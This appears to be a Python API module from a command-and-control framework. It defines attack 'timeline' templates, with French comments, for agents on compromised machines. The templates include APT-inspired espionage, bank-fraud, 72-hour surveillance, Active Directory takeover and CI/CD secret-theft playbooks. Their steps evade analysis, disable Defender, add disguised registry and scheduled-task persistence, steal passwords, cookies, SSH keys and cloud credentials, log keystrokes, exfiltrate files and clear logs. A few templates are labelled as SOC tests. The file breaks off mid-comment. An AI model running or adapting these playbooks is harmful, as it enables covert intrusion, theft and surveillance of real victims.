import json
from datetime import datetime, timezone

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field

from core.orchestrator import Orchestrator
from database import database
from db.models import PocTemplate, Timeline
from dependencies import CurrentUser, OperatorUser

router = APIRouter(prefix="/timelines", tags=["timelines"])
pocs_router = APIRouter(prefix="/pocs", tags=["pocs"])
orchestrator = Orchestrator()


class TimelineStep(BaseModel):
    order: int
    module: str
    action: str = "run"
    params: dict = {}
    delay: float = 0
    timeout: int = 60
    priority: str = "normal"


class TimelineCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=128)
    description: str = ""
    agent_group: list[str] = ["all"]
    steps: list[TimelineStep] = []
    trigger: str = "manual"
    loop: int | bool = False
    status: str = "draft"


class TimelineUpdate(BaseModel):
    name: str | None = None
    description: str | None = None
    agent_group: list[str] | None = None
    steps: list[TimelineStep] | None = None
    trigger: str | None = None
    loop: int | bool | None = None
    status: str | None = None


ATTACK_TEMPLATES = [
    # =========================================================================
    # OP NIGHTSHADE — Corporate espionage, zero footprint
    # Objectif : voler les secrets R&D d'une entreprise cible sans se faire
    # détecter. Inspiré APT29 (Cozy Bear). Priorité absolue : aucune trace.
    # =========================================================================
    {
        "id": "op_nightshade",
        "name": "OP NIGHTSHADE — Espionnage Corporate",
        "description": "Opération d'espionnage longue durée ciblant les secrets R&D, emails dirigeants et propriété intellectuelle. Furtivité maximale : anti-forensics, persistance registry camouflée, exfil par chunks de 512KB sur HTTPS. Inspiré APT29.",
        "icon": "🌑",
        "category": "full",
        "trigger": "on_connect",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Landing & Assess", "steps": [1,2,3,4,5]},
            {"label": "Phase 2 — Ghost Install",    "steps": [6,7,8,9,10]},
            {"label": "Phase 3 — Recon Silencieux", "steps": [11,12,13,14,15,16]},
            {"label": "Phase 4 — IP Theft",         "steps": [17,18,19,20,21]},
            {"label": "Phase 5 — Exfil & Vanish",   "steps": [22,23,24,25]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",          "params": {"abort_on_detected": True},                                    "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "anti_analysis",  "action": "evade",          "params": {},                                                              "delay": 2,  "timeout": 20,  "priority": "critical"},
            {"order": 3,  "module": "info",           "action": "run",            "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 4,  "module": "builtin",        "action": "sysinfo",        "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 5,  "module": "builtin",        "action": "processes",      "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 6,  "module": "builtin",        "action": "persist",        "params": {"method": "registry", "key": "WindowsDefenderUpdate"},          "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 7,  "module": "builtin",        "action": "persist",        "params": {"method": "scheduled_task", "name": "AdobeAcrobatSync", "interval": "daily"}, "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 8,  "module": "builtin",        "action": "hide",           "params": {"method": "attrib_hidden"},                                     "delay": 2,  "timeout": 15,  "priority": "high"},
            {"order": 9,  "module": "builtin",        "action": "disable_defender","params": {},                                                             "delay": 3,  "timeout": 30,  "priority": "high"},
            {"order": 10, "module": "builtin",        "action": "firewall_rule",  "params": {"action": "allow", "port": 443, "name": "MicrosoftTelemetry"},  "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 11, "module": "builtin",        "action": "users",          "params": {},                                                              "delay": 3,  "timeout": 20,  "priority": "normal"},
            {"order": 12, "module": "builtin",        "action": "netinfo",        "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 13, "module": "builtin",        "action": "shares",         "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 14, "module": "port_scan",      "action": "subnet",         "params": {"cidr": "192.168.1.0/24", "ports": [22,80,443,445,8080], "timeout": 1}, "delay": 5, "timeout": 120, "priority": "low"},
            {"order": 15, "module": "builtin",        "action": "domain_admins",  "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 16, "module": "builtin",        "action": "env_secrets",    "params": {"patterns": ["TOKEN","SECRET","API_KEY","AWS","AZURE","GCP"]},   "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 17, "module": "file",           "action": "search",         "params": {"pattern": "*.pdf,*.docx,*.pptx,*.xlsx,*.dwg,*.cad", "paths": ["~/Documents","~/Desktop","~/Dropbox","~/OneDrive"], "max": 300}, "delay": 5, "timeout": 180, "priority": "critical"},
            {"order": 18, "module": "builtin",        "action": "outlook_emails", "params": {"limit": 500, "folders": ["Inbox","Sent","Drafts"]},             "delay": 3,  "timeout": 120, "priority": "critical"},
            {"order": 19, "module": "browser",        "action": "passwords",      "params": {"browsers": ["chrome","firefox","edge"]},                       "delay": 3,  "timeout": 90,  "priority": "high"},
            {"order": 20, "module": "keylog",         "action": "start",          "params": {"duration": 120, "flush_interval": 30},                         "delay": 5,  "timeout": 180, "priority": "normal"},
            {"order": 21, "module": "screenshot",     "action": "capture",        "params": {"count": 8, "interval": 15},                                    "delay": 5,  "timeout": 180, "priority": "normal"},
            {"order": 22, "module": "file",           "action": "exfil",          "params": {"compress": True, "encrypt": True, "chunk_size": 512000},        "delay": 10, "timeout": 600, "priority": "critical"},
            {"order": 23, "module": "builtin",        "action": "clear_logs",     "params": {"logs": ["Security","System","Application","PowerShell"]},       "delay": 5,  "timeout": 30,  "priority": "critical"},
            {"order": 24, "module": "builtin",        "action": "clear_history",  "params": {},                                                              "delay": 2,  "timeout": 15,  "priority": "high"},
            {"order": 25, "module": "builtin",        "action": "wipe_traces",    "params": {"temp": True, "prefetch": True, "thumbcache": True},             "delay": 3,  "timeout": 30,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP LAZARUS — Financial fraud & wire transfer hijack
    # Objectif : accès aux outils financiers, virement détourné, keylog ciblé
    # sur les sessions bancaires. Inspiré Lazarus Group (DPRK).
    # =========================================================================
    {
        "id": "op_lazarus",
        "name": "OP LAZARUS — Fraude Financière",
        "description": "Ciblage des outils financiers (SAP, QuickBooks, portails bancaires). Keylogger déclenché à l'ouverture des sessions de paiement, capture des credentials bancaires, monitoring des virements en cours. Inspiré Lazarus Group.",
        "icon": "💸",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Target Profiling",     "steps": [1,2,3,4,5,6]},
            {"label": "Phase 2 — Credential Harvest",   "steps": [7,8,9,10,11,12]},
            {"label": "Phase 3 — Financial Monitoring", "steps": [13,14,15,16]},
            {"label": "Phase 4 — Collect & Exfil",      "steps": [17,18,19]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",          "params": {"abort_on_detected": True},                                    "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "info",           "action": "run",            "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 3,  "module": "builtin",        "action": "processes",      "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 4,  "module": "builtin",        "action": "installed",      "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 5,  "module": "builtin",        "action": "netstat",        "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 6,  "module": "screen_stream",  "action": "frame",          "params": {"quality": 90},                                                 "delay": 2,  "timeout": 15,  "priority": "high"},
            {"order": 7,  "module": "browser",        "action": "passwords",      "params": {"browsers": ["chrome","firefox","edge","ie"]},                  "delay": 3,  "timeout": 90,  "priority": "critical"},
            {"order": 8,  "module": "browser",        "action": "cookies",        "params": {"filter": ["bank","swift","sap","quickbooks","paypal","stripe"]}, "delay": 3, "timeout": 60, "priority": "critical"},
            {"order": 9,  "module": "browser",        "action": "autofill",       "params": {},                                                              "delay": 2,  "timeout": 60,  "priority": "high"},
            {"order": 10, "module": "builtin",        "action": "credential_manager", "params": {},                                                          "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 11, "module": "builtin",        "action": "env_secrets",    "params": {"patterns": ["BANK","SWIFT","IBAN","SAP","PAY","STRIPE","WIRE"]}, "delay": 2, "timeout": 20, "priority": "critical"},
            {"order": 12, "module": "file",           "action": "search",         "params": {"pattern": "*.qbw,*.sap,*.xlsx,*.csv,IBAN*,SWIFT*,wire*", "max": 100}, "delay": 3, "timeout": 90, "priority": "critical"},
            {"order": 13, "module": "keylog",         "action": "start",          "params": {"duration": 300, "flush_interval": 30, "filter_apps": ["chrome","firefox","sap","quickbooks"]}, "delay": 5, "timeout": 360, "priority": "critical"},
            {"order": 14, "module": "screenshot",     "action": "capture",        "params": {"count": 15, "interval": 20},                                   "delay": 5,  "timeout": 400, "priority": "high"},
            {"order": 15, "module": "screen_stream",  "action": "start",          "params": {"fps": 2, "quality": 70},                                       "delay": 5,  "timeout": 15,  "priority": "high"},
            {"order": 16, "module": "remote_control", "action": "clipboard_get",  "params": {},                                                              "delay": 10, "timeout": 10,  "priority": "high"},
            {"order": 17, "module": "builtin",        "action": "outlook_emails", "params": {"limit": 200, "folders": ["Inbox","Sent"], "filter": ["payment","invoice","wire","transfer","IBAN"]}, "delay": 5, "timeout": 120, "priority": "high"},
            {"order": 18, "module": "file",           "action": "exfil",          "params": {"compress": True, "encrypt": True, "chunk_size": 256000},        "delay": 10, "timeout": 300, "priority": "critical"},
            {"order": 19, "module": "builtin",        "action": "clear_logs",     "params": {"logs": ["Security","Application"]},                            "delay": 5,  "timeout": 20,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP PHANTOM EMPLOYEE — Insider threat simulation
    # Objectif : simuler un employé malveillant qui vole des données avant
    # de quitter l'entreprise. Accès légitime, actions ciblées.
    # =========================================================================
    {
        "id": "op_phantom_employee",
        "name": "OP PHANTOM EMPLOYEE — Insider Threat",
        "description": "Simule un employé malveillant avec accès légitime au réseau. Collecte discrète de données confidentielles, contacts, code source et projets. Exfil via compression camouflée. Test de DLP et monitoring interne.",
        "icon": "🕴",
        "category": "exfil",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Profiling Environnement", "steps": [1,2,3,4]},
            {"label": "Phase 2 — Collecte Données Corp",   "steps": [5,6,7,8,9]},
            {"label": "Phase 3 — Contacts & Réseau",       "steps": [10,11,12]},
            {"label": "Phase 4 — Code Source & IP",        "steps": [13,14,15]},
            {"label": "Phase 5 — Exfil Camouflée",         "steps": [16,17]},
        ],
        "steps": [
            {"order": 1,  "module": "info",           "action": "run",            "params": {},                                                              "delay": 0,  "timeout": 30,  "priority": "normal"},
            {"order": 2,  "module": "builtin",        "action": "disks",          "params": {},                                                              "delay": 2,  "timeout": 15,  "priority": "normal"},
            {"order": 3,  "module": "builtin",        "action": "shares",         "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 4,  "module": "builtin",        "action": "recent_files",   "params": {"limit": 200},                                                  "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 5,  "module": "file",           "action": "search",         "params": {"pattern": "*.pdf,*.docx,*.pptx,*.xlsx", "paths": ["~/Documents","~/Desktop","~/SharePoint","~/Teams","~/OneDrive"], "max": 500}, "delay": 5, "timeout": 180, "priority": "high"},
            {"order": 6,  "module": "file",           "action": "search",         "params": {"pattern": "NDA*,Confidentiel*,Secret*,Proprietary*,*.p12,*.pfx", "max": 100}, "delay": 3, "timeout": 90, "priority": "critical"},
            {"order": 7,  "module": "builtin",        "action": "outlook_emails", "params": {"limit": 1000, "folders": ["Inbox","Sent","Contacts"]},          "delay": 5,  "timeout": 180, "priority": "high"},
            {"order": 8,  "module": "builtin",        "action": "telegram_data",  "params": {},                                                              "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 9,  "module": "screenshot",     "action": "capture",        "params": {"count": 10, "interval": 5},                                    "delay": 5,  "timeout": 90,  "priority": "normal"},
            {"order": 10, "module": "builtin",        "action": "domain_users",   "params": {},                                                              "delay": 3,  "timeout": 30,  "priority": "normal"},
            {"order": 11, "module": "wifi",           "action": "scan",           "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "low"},
            {"order": 12, "module": "builtin",        "action": "netinfo",        "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "low"},
            {"order": 13, "module": "file",           "action": "search",         "params": {"pattern": "*.py,*.js,*.ts,*.go,*.java,*.cs,*.cpp,*.h,*.sol", "paths": ["~/code","~/projects","~/src","~/dev","~/repos","~/git"], "max": 500}, "delay": 5, "timeout": 180, "priority": "critical"},
            {"order": 14, "module": "file",           "action": "search",         "params": {"pattern": "*.sql,*.db,*.sqlite,*.mdb,*.bak", "max": 50},       "delay": 3,  "timeout": 90,  "priority": "high"},
            {"order": 15, "module": "browser",        "action": "history",        "params": {"limit": 2000},                                                 "delay": 2,  "timeout": 60,  "priority": "low"},
            {"order": 16, "module": "file",           "action": "exfil",          "params": {"compress": True, "encrypt": True, "chunk_size": 1024000, "disguise_ext": ".bak"}, "delay": 10, "timeout": 600, "priority": "critical"},
            {"order": 17, "module": "builtin",        "action": "clear_history",  "params": {},                                                              "delay": 3,  "timeout": 15,  "priority": "normal"},
        ],
    },

    # =========================================================================
    # OP DOMINO — Active Directory takeover (Lateral + Privilege Escalation)
    # Objectif : compromettre l'AD, énumérer domaine, préparer le pivot
    # vers les DC et serveurs critiques.
    # =========================================================================
    {
        "id": "op_domino",
        "name": "OP DOMINO — AD Takeover",
        "description": "Prise de contrôle progressive d'un Active Directory. Énumération réseau → identification des DCs → dump des sessions admin actives → collecte tickets Kerberos → cartographie trusts → pivot préparé vers serveurs critiques.",
        "icon": "🎯",
        "category": "lateral",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Network Mapping",      "steps": [1,2,3,4,5]},
            {"label": "Phase 2 — AD Enumeration",       "steps": [6,7,8,9,10]},
            {"label": "Phase 3 — Credential Access",    "steps": [11,12,13,14]},
            {"label": "Phase 4 — Pivot Preparation",    "steps": [15,16,17]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",          "params": {},                                                              "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "builtin",        "action": "netinfo",         "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 3,  "module": "builtin",        "action": "arp",             "params": {},                                                              "delay": 2,  "timeout": 20,  "priority": "normal"},
            {"order": 4,  "module": "port_scan",      "action": "subnet",          "params": {"cidr": "192.168.1.0/24", "ports": [22,53,80,88,135,139,389,443,445,464,636,3268,3269,3389,5985,9389], "timeout": 1}, "delay": 5, "timeout": 180, "priority": "normal"},
            {"order": 5,  "module": "builtin",        "action": "dns_enum",        "params": {"domain": "corp.local"},                                        "delay": 3,  "timeout": 60,  "priority": "normal"},
            {"order": 6,  "module": "builtin",        "action": "domain_users",    "params": {},                                                              "delay": 3,  "timeout": 30,  "priority": "high"},
            {"order": 7,  "module": "builtin",        "action": "domain_admins",   "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 8,  "module": "builtin",        "action": "domain_computers","params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 9,  "module": "builtin",        "action": "trust_domains",   "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 10, "module": "builtin",        "action": "shares",          "params": {},                                                              "delay": 3,  "timeout": 60,  "priority": "normal"},
            {"order": 11, "module": "builtin",        "action": "sessions",        "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 12, "module": "builtin",        "action": "credential_manager","params": {},                                                            "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 13, "module": "builtin",        "action": "ssh_keys",        "params": {},                                                              "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 14, "module": "file",           "action": "search",          "params": {"pattern": "*.kirbi,*.ccache,ntds.dit,SYSTEM,SAM,*.pfx,*.p12", "max": 50}, "delay": 3, "timeout": 60, "priority": "critical"},
            {"order": 15, "module": "builtin",        "action": "netstat",         "params": {},                                                              "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 16, "module": "builtin",        "action": "persist",         "params": {"method": "registry", "key": "WindowsNetworkDiagnostics"},      "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 17, "module": "builtin",        "action": "clear_logs",      "params": {"logs": ["Security","System"]},                                 "delay": 3,  "timeout": 20,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP SHADOW WATCH — Long-term silent surveillance
    # Objectif : présence indétectable sur 24-72h, collecte comportementale
    # complète. Keylog, screen, webcam, activité réseau, pattern journalier.
    # =========================================================================
    {
        "id": "op_shadow_watch",
        "name": "OP SHADOW WATCH — Surveillance 72h",
        "description": "Présence silencieuse prolongée 24-72h. Installation furtive → keylogger continu + screenshots toutes les 60s + monitoring réseau + collecte browser périodique → rapport comportemental complet sur la cible. Aucun bruit réseau excessif.",
        "icon": "👁",
        "category": "surveillance",
        "trigger": "on_connect",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Install Furtif",    "steps": [1,2,3,4]},
            {"label": "Phase 2 — Surveillance Active","steps": [5,6,7,8,9]},
            {"label": "Phase 3 — Collect Périodique","steps": [10,11,12]},
            {"label": "Phase 4 — Maintenance",       "steps": [13,14]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",          "params": {"abort_on_detected": True},                                    "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "anti_analysis",  "action": "evade",          "params": {},                                                              "delay": 2,  "timeout": 20,  "priority": "critical"},
            {"order": 3,  "module": "builtin",        "action": "persist",         "params": {"method": "registry", "key": "SysHostManager"},                "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 4,  "module": "builtin",        "action": "persist",         "params": {"method": "scheduled_task", "name": "WindowsHostManager", "interval": "hourly"}, "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 5,  "module": "keylog",         "action": "start",           "params": {"duration": 86400, "flush_interval": 300},                     "delay": 5,  "timeout": 87000,"priority": "high"},
            {"order": 6,  "module": "screenshot",     "action": "capture",         "params": {"count": 50, "interval": 60},                                  "delay": 5,  "timeout": 4000, "priority": "normal"},
            {"order": 7,  "module": "screen_stream",  "action": "start",           "params": {"fps": 1, "quality": 40},                                      "delay": 10, "timeout": 15,   "priority": "normal"},
            {"order": 8,  "module": "builtin",        "action": "netstat",         "params": {},                                                              "delay": 5,  "timeout": 30,   "priority": "low"},
            {"order": 9,  "module": "remote_control", "action": "clipboard_get",   "params": {},                                                              "delay": 30, "timeout": 10,   "priority": "normal"},
            {"order": 10, "module": "browser",        "action": "history",         "params": {"limit": 500},                                                  "delay": 120,"timeout": 60,   "priority": "low"},
            {"order": 11, "module": "builtin",        "action": "processes",       "params": {},                                                              "delay": 60, "timeout": 30,   "priority": "low"},
            {"order": 12, "module": "wifi",           "action": "scan",            "params": {},                                                              "delay": 300,"timeout": 30,   "priority": "low"},
            {"order": 13, "module": "builtin",        "action": "clear_logs",      "params": {"logs": ["Security"]},                                          "delay": 3600,"timeout": 20,  "priority": "low"},
            {"order": 14, "module": "info",           "action": "run",             "params": {},                                                              "delay": 3600,"timeout": 30,  "priority": "low"},
        ],
    },

    # =========================================================================
    # OP KRAKEN — Ransomware readiness assessment (SOC test)
    # Objectif : tester la détection ransomware d'une infrastructure.
    # Simule toutes les étapes SANS chiffrer quoi que ce soit.
    # =========================================================================
    {
        "id": "op_kraken",
        "name": "OP KRAKEN — Test Réponse Ransomware",
        "description": "Simulation complète d'une attaque ransomware (SANS chiffrement réel) pour tester les capacités de détection et réponse du SOC. Kill processes → enum shadow copies → marquage fichiers → lateral prep → exfil données → cover tracks.",
        "icon": "🐙",
        "category": "simulation",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Initial Access",      "steps": [1,2,3,4]},
            {"label": "Phase 2 — Defense Disabling",   "steps": [5,6,7]},
            {"label": "Phase 3 — Impact Assessment",   "steps": [8,9,10,11]},
            {"label": "Phase 4 — Ransom Simulation",   "steps": [12,13]},
            {"label": "Phase 5 — Exfil Before Lock",   "steps": [14,15,16]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",           "params": {},                                                             "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "info",           "action": "run",             "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 3,  "module": "builtin",        "action": "processes",       "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 4,  "module": "builtin",        "action": "netinfo",         "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 5,  "module": "builtin",        "action": "disable_defender","params": {},                                                             "delay": 3,  "timeout": 30,  "priority": "critical"},
            {"order": 6,  "module": "builtin",        "action": "shadow_copies",   "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "critical"},
            {"order": 7,  "module": "builtin",        "action": "backups_enum",    "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 8,  "module": "file",           "action": "search",          "params": {"pattern": "*.pdf,*.docx,*.xlsx,*.jpg,*.db,*.sql,*.bak", "paths": ["~/Documents","~/Desktop","~/Server"], "max": 1000}, "delay": 5, "timeout": 180, "priority": "high"},
            {"order": 9,  "module": "builtin",        "action": "shares",          "params": {},                                                             "delay": 3,  "timeout": 60,  "priority": "normal"},
            {"order": 10, "module": "port_scan",      "action": "subnet",          "params": {"cidr": "192.168.1.0/24", "ports": [445,3389,22], "timeout": 1}, "delay": 5, "timeout": 90, "priority": "normal"},
            {"order": 11, "module": "screen_stream",  "action": "frame",           "params": {"quality": 90},                                                "delay": 2,  "timeout": 15,  "priority": "high"},
            {"order": 12, "module": "builtin",        "action": "simulate_ransom", "params": {"marker": ".KRAKEN_TEST", "paths": ["~/Desktop/RANSOM_TEST"], "dry_run": True, "create_note": True}, "delay": 5, "timeout": 60, "priority": "critical"},
            {"order": 13, "module": "screenshot",     "action": "capture",         "params": {"count": 5, "interval": 5},                                    "delay": 2,  "timeout": 60,  "priority": "high"},
            {"order": 14, "module": "file",           "action": "exfil",           "params": {"compress": True, "encrypt": True, "chunk_size": 512000},       "delay": 10, "timeout": 300, "priority": "critical"},
            {"order": 15, "module": "builtin",        "action": "clear_logs",      "params": {"logs": ["Security","System","Application"]},                  "delay": 5,  "timeout": 30,  "priority": "critical"},
            {"order": 16, "module": "builtin",        "action": "wipe_traces",     "params": {"temp": True, "prefetch": True},                               "delay": 3,  "timeout": 20,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP ICEBERG — Supply chain / DevOps attack
    # Objectif : compromettre un poste dev pour accéder aux secrets CI/CD,
    # tokens GitHub/GitLab, credentials cloud (AWS/Azure/GCP), pipelines.
    # =========================================================================
    {
        "id": "op_iceberg",
        "name": "OP ICEBERG — Supply Chain / DevOps",
        "description": "Attaque d'un poste développeur pour compromettre la chaîne CI/CD. Vol de tokens GitHub/GitLab, secrets AWS/Azure/GCP, clés SSH de déploiement, fichiers .env de production. Accès potentiel à tous les environnements de production.",
        "icon": "🧊",
        "category": "credentials",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Phase 1 — Dev Profiling",    "steps": [1,2,3,4]},
            {"label": "Phase 2 — Secret Extraction","steps": [5,6,7,8,9,10]},
            {"label": "Phase 3 — Code & Pipeline",  "steps": [11,12,13]},
            {"label": "Phase 4 — Cloud Access",     "steps": [14,15,16]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",           "params": {},                                                             "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "info",           "action": "run",             "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "high"},
            {"order": 3,  "module": "builtin",        "action": "installed",       "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 4,  "module": "builtin",        "action": "processes",       "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "normal"},
            {"order": 5,  "module": "builtin",        "action": "env_secrets",     "params": {"patterns": ["TOKEN","SECRET","API_KEY","AWS","AZURE","GCP","GITHUB","GITLAB","DOCKER","NPM","PYPI","SLACK"]}, "delay": 3, "timeout": 30, "priority": "critical"},
            {"order": 6,  "module": "builtin",        "action": "ssh_keys",        "params": {},                                                             "delay": 2,  "timeout": 20,  "priority": "critical"},
            {"order": 7,  "module": "file",           "action": "search",          "params": {"pattern": ".env,.env.local,.env.prod,.env.staging,*.pem,*.p12,*.pfx,id_rsa,id_ed25519,*.key,credentials.json", "max": 200, "recursive": True}, "delay": 5, "timeout": 180, "priority": "critical"},
            {"order": 8,  "module": "file",           "action": "search",          "params": {"pattern": ".aws/credentials,.azure/*,.kube/config,*.tfvars,terraform.tfstate*", "max": 50}, "delay": 3, "timeout": 60, "priority": "critical"},
            {"order": 9,  "module": "builtin",        "action": "shell_history",   "params": {},                                                             "delay": 2,  "timeout": 20,  "priority": "high"},
            {"order": 10, "module": "browser",        "action": "passwords",       "params": {"filter": ["github","gitlab","aws","azure","gcp","docker","npm","heroku"]}, "delay": 3, "timeout": 90, "priority": "critical"},
            {"order": 11, "module": "file",           "action": "search",          "params": {"pattern": "*.yml,*.yaml,Jenkinsfile,Dockerfile,.github/workflows/*.yml,*.ci.yml", "max": 100}, "delay": 3, "timeout": 90, "priority": "high"},
            {"order": 12, "module": "file",           "action": "search",          "params": {"pattern": "package.json,requirements.txt,go.mod,Cargo.toml,*.csproj", "max": 50}, "delay": 2, "timeout": 60, "priority": "normal"},
            {"order": 13, "module": "builtin",        "action": "netinfo",         "params": {},                                                             "delay": 2,  "timeout": 30,  "priority": "low"},
            {"order": 14, "module": "file",           "action": "search",          "params": {"pattern": "*.py,*.js,*.ts,*.go,*.java", "paths": ["~/code","~/projects","~/repos","~/workspace"], "max": 300}, "delay": 5, "timeout": 180, "priority": "normal"},
            {"order": 15, "module": "file",           "action": "exfil",           "params": {"compress": True, "encrypt": True, "chunk_size": 512000},       "delay": 10, "timeout": 600, "priority": "critical"},
            {"order": 16, "module": "builtin",        "action": "clear_history",   "params": {},                                                             "delay": 3,  "timeout": 15,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP BLINDSPOT — SOC evasion & detection gap analysis
    # Objectif : cartographier les angles morts du SOC. Tester toutes les
    # techniques d'évasion, mesurer le temps avant détection.
    # =========================================================================
    {
        "id": "op_blindspot",
        "name": "OP BLINDSPOT — Analyse Angles Morts SOC",
        "description": "Teste méthodiquement les capacités de détection du SOC. Chaque technique est exécutée avec un délai pour mesurer le temps de réaction : anti-AV, persistence multi-vecteurs, mouvement latéral, exfil HTTPS, effacement logs.",
        "icon": "🕳",
        "category": "simulation",
        "trigger": "manual",
        "agent_group": ["all"],
        "phases": [
            {"label": "Test 1 — AV/EDR Evasion",      "steps": [1,2,3]},
            {"label": "Test 2 — Persistence",          "steps": [4,5,6]},
            {"label": "Test 3 — Credential Access",    "steps": [7,8,9]},
            {"label": "Test 4 — Lateral Movement",     "steps": [10,11,12]},
            {"label": "Test 5 — Exfiltration",         "steps": [13,14]},
            {"label": "Test 6 — Log Tampering",        "steps": [15,16]},
        ],
        "steps": [
            {"order": 1,  "module": "anti_analysis",  "action": "check",           "params": {},                                                             "delay": 0,  "timeout": 15,  "priority": "critical"},
            {"order": 2,  "module": "anti_analysis",  "action": "evade",           "params": {},                                                             "delay": 30, "timeout": 20,  "priority": "critical"},
            {"order": 3,  "module": "builtin",        "action": "disable_defender","params": {},                                                             "delay": 60, "timeout": 30,  "priority": "critical"},
            {"order": 4,  "module": "builtin",        "action": "persist",         "params": {"method": "registry"},                                         "delay": 60, "timeout": 30,  "priority": "critical"},
            {"order": 5,  "module": "builtin",        "action": "persist",         "params": {"method": "scheduled_task", "name": "SvcHostMonitor"},          "delay": 30, "timeout": 30,  "priority": "critical"},
            {"order": 6,  "module": "builtin",        "action": "startup",         "params": {},                                                             "delay": 60, "timeout": 20,  "priority": "high"},
            {"order": 7,  "module": "browser",        "action": "passwords",       "params": {"browsers": ["chrome","firefox"]},                             "delay": 120,"timeout": 90,  "priority": "critical"},
            {"order": 8,  "module": "builtin",        "action": "credential_manager","params": {},                                                           "delay": 30, "timeout": 30,  "priority": "critical"},
            {"order": 9,  "module": "keylog",         "action": "start",           "params": {"duration": 60},                                               "delay": 120,"timeout": 90,  "priority": "high"},
            {"order": 10, "module": "builtin",        "action": "arp",             "params": {},                                                             "delay": 120,"timeout": 20,  "priority": "normal"},
            {"order": 11, "module": "port_scan",      "action": "subnet",          "params": {"cidr": "192.168.1.0/24", "ports": [445,3389,22,80], "timeout": 1}, "delay": 60, "timeout": 90, "priority": "normal"},
            {"order": 12, "module": "builtin",        "action": "sessions",        "params": {},                                                             "delay": 60, "timeout": 30,  "priority": "high"},
            {"order": 13, "module": "file",           "action": "search",          "params": {"pattern": "*.docx,*.xlsx,*.pdf", "max": 20},                  "delay": 120,"timeout": 60,  "priority": "high"},
            {"order": 14, "module": "file",           "action": "exfil",           "params": {"compress": True, "encrypt": True, "chunk_size": 128000},       "delay": 60, "timeout": 120, "priority": "critical"},
            {"order": 15, "module": "builtin",        "action": "clear_logs",      "params": {"logs": ["Security","System","PowerShell","Application"]},      "delay": 120,"timeout": 30,  "priority": "critical"},
            {"order": 16, "module": "builtin",        "action": "wipe_traces",     "params": {"temp": True, "prefetch": True, "thumbcache": True},            "delay": 30, "timeout": 30,  "priority": "high"},
        ],
    },

    # =========================================================================
    # OP VIPER — Rapid initial access triage (first 5 minutes)
    # Objectif : collecter TOUT en 5 min dès l'arrivée sur une machine.
